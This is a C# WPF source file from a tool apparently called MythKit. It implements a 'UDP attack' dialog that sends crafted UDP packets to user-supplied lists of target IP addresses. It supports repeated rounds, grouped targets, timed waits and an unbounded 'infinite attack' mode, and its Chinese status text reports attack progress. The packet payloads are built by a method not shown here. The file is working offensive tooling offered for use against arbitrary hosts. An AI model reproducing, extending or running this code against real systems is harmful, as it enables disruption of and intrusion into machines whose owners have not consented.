using iNKORE.UI.WPF.Modern.Controls;
using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Threading;
using System.Windows;
using Modern = iNKORE.UI.WPF.Modern.Controls;

namespace MythKit.Pages.UDPAttack
{
    public partial class AttackDialog : Modern.ContentDialog
    {
        private object _attackFunction;
        private AttackIndex _attackIndex;
        private Type _functionType;
        private UDPAttackTypeLegacyAttribute _typeAttribute;
        private Thread _attackThread;
        private bool _skipped = false;
        private bool _stopped = false;

        public AttackDialog(object attackFunction, Type functionType, UDPAttackTypeLegacyAttribute typeAttribute, AttackIndex attackIndex)
        {
            InitializeComponent();
            _attackFunction = attackFunction;
            _functionType = functionType;
            _typeAttribute = typeAttribute;
            _attackIndex = attackIndex;
            _attackThread = new Thread(new ThreadStart(Attack));
            _attackThread.Start();
        }

        private void Attack()
        {
            try
            {
                var ipAddresses = new List<string>();
                string ipAddesses = "";
                int attackTotalTimes = 1;
                int attackTimesInterval = 10;
                int groupMember = 0;
                int groupInterval = 10;
                bool groupEnabled = false;
                bool showLog = true;
                bool infiniteSend = false;

                base.Dispatcher.Invoke(() =>
                {
                    ipAddesses = _attackIndex.TargetIPAddress.Text;
                    foreach (string ip in ipAddesses.Split(new char[] { ',' }, StringSplitOptions.RemoveEmptyEntries))
                    {
                        ipAddresses.Add(ip.Trim());
                    }

                    if ((bool)_attackIndex.EnableInterval.IsChecked)
                    {
                        attackTotalTimes = (int)_attackIndex.IntervalTimes.Value;
                        attackTimesInterval = (int)_attackIndex.IntervalSeconds.Value;
                        infiniteSend = !(bool)_attackIndex.NotInfiniteSwitch.IsChecked;
                    }

                    groupEnabled = (bool)_attackIndex.EnableGroupIP.IsChecked;
                    if (groupEnabled)
                    {
                        groupMember = (int)_attackIndex.GroupIPNumber.Value;
                        groupInterval = (int)_attackIndex.GroupInterval.Value;
                    }

                    showLog = _attackIndex.ShowLog.IsChecked.GetValueOrDefault();
                    if (!showLog)
                    {
                        LogTextBox.Visibility = Visibility.Collapsed;
                    }
                });

                for (int attackNumber = 1; infiniteSend || attackNumber <= attackTotalTimes; attackNumber++)
                {
                    if (_stopped) break;

                    for (int targetIPIndex = 1; targetIPIndex <= ipAddresses.Count; targetIPIndex++)
                    {
                        string currentIP = ipAddresses[targetIPIndex - 1];
                        if (_stopped) break;

                        if (_skipped)
                        {
                            while (_skipped)
                            {
                                Thread.Sleep(100);
                            }
                        }
                        int groupCount = 1;
                        if (groupEnabled)
                        {
                            groupCount = (targetIPIndex - 1) / groupMember + 1;
                        }
                        string message = "";
                        AttackPacket packets = null;
                        object[] packetConstructorArgs = new object[] { message, currentIP, attackNumber, groupCount };
                        base.Dispatcher.Invoke(() =>
                        {
                            var constructorMethod = _functionType.GetMethod(_typeAttribute.PacketConstruct);
                            if (constructorMethod != null)
                            {
                                packets = constructorMethod.Invoke(_attackFunction, packetConstructorArgs) as AttackPacket;
                            }
                        });

                        for (int packetCount = 0; packetCount < packets.AttackPackets.Count; packetCount++)
                        {
                            UdpClient udpClient = new UdpClient();
                            byte[] packet = packets.AttackPackets[packetCount];
                            try
                            {
                                udpClient.Send(packet, packet.Length, currentIP, packets.TargetPort);
                            }
                            catch (Exception ex)
                            {
                                if (showLog)
                                {
                                    Log($"=> {currentIP} ERROR - {ex.Message}");
                                }
                            }
                            if (packets.IntervalMiliseconds > 0 && packetCount == packets.AttackPackets.Count - 1)
                            {
                                Thread.Sleep(packets.IntervalMiliseconds);
                            }
                        }

                        double progress = (double)((attackNumber - 1) * ipAddresses.Count + targetIPIndex) / (double)(attackTotalTimes * ipAddresses.Count) * 100.0;
                        base.Dispatcher.Invoke(() =>
                        {
                            if (infiniteSend)
                            {
                                AttackProgressRing.IsIndeterminate = true;
                                AttackProgressText.Text = $"正在进行无限次攻击";
                                AttackCycleText.Text = $"已攻击 {(attackNumber - 1) * ipAddresses.Count + targetIPIndex} 次。\n" +
                                                       $"第 {attackNumber} 轮攻击，本轮已攻击 {targetIPIndex}/{ipAddresses.Count} 个 IP。";
                            }
                            else
                            {
                                AttackProgressRing.IsIndeterminate = false;
                                AttackProgressRing.Value = progress;
                                AttackProgressText.Text = $"进度 {Math.Round(progress, 2)}%";
                                AttackCycleText.Text = $"已攻击 {(attackNumber - 1) * ipAddresses.Count + targetIPIndex}/{attackTotalTimes * ipAddresses.Count} 次。\n" +
                                                       $"第 {attackNumber}/{attackTotalTimes} 轮攻击，本轮已攻击 {targetIPIndex}/{ipAddresses.Count} 个 IP。";
                            }
                            AttackStateText.Text = "正在发送数据包";
                        });

                        if (targetIPIndex == ipAddresses.Count) break;

                        if (groupEnabled && targetIPIndex % groupMember == 0)
                        {
                            for (int i = 0; i < groupInterval; i++)
                            {
                                if (_stopped) break;

                                if (_skipped)
                                {
                                    while (_skipped)
                                    {
                                        Thread.Sleep(100);
                                    }
                                }

                                base.Dispatcher.Invoke(() =>
                                {
                                    AttackStateText.Text = $"等待 {groupInterval - i} 秒后攻击下一分组";
                                });
                                Thread.Sleep(1000);
                            }
                        }
                    }

                    if ((!infiniteSend) && (attackNumber == attackTotalTimes)) break;

                    for (int i = 0; i < attackTimesInterval; i++)
                    {
                        if (_stopped) break;

                        if (_skipped)
                        {
                            while (_skipped)
                            {
                                Thread.Sleep(100);
                            }
                        }

                        base.Dispatcher.Invoke(() =>
                        {
                            AttackStateText.Text = $"等待 {attackTimesInterval - i} 秒后攻击下一轮";
                        });
                        Thread.Sleep(1000);
                    }
                }

                base.Dispatcher.Invoke(() =>
                {
                    Title = AttackStateText.Text = "攻击结束";
                    CloseButtonText = "关闭";
                    IsPrimaryButtonEnabled = false;
                    PrimaryButtonText = string.Empty;
                    DefaultButton = ContentDialogButton.Close;
                });
            }
            catch
            {
                base.Dispatcher.Invoke(() =>
                {
                    Title = AttackStateText.Text = "攻击失败";
                    CloseButtonText = "关闭";
                    SecondaryButtonText = string.Empty;
                    PrimaryButtonText = string.Empty;
                    DefaultButton = ContentDialogButton.Close;
                });
            }
        }


        private void Log(string message)
        {
            Dispatcher.Invoke(delegate ()
            {
                LogTextBox.AppendText(message + Environment.NewLine);
                LogTextBox.ScrollToEnd();
            });
        }

        private void ContentDialog_CloseButtonClick(ContentDialog sender, ContentDialogButtonClickEventArgs args)
        {
            _stopped = true;
        }

        private void ContentDialog_PrimaryButtonClick(ContentDialog sender, ContentDialogButtonClickEventArgs args)
        {
            args.Cancel = true;
            _skipped = !_skipped;
            Title = (_skipped ? "已暂停" : "正在攻击");
            PrimaryButtonText = (_skipped ? "继续" : "暂停");
        }

        private void ContentDialog_SecondaryButtonClick(ContentDialog sender, ContentDialogButtonClickEventArgs args)
        {
            args.Cancel = true;
            LogTextBox.Text = string.Empty;
        }
    }
}
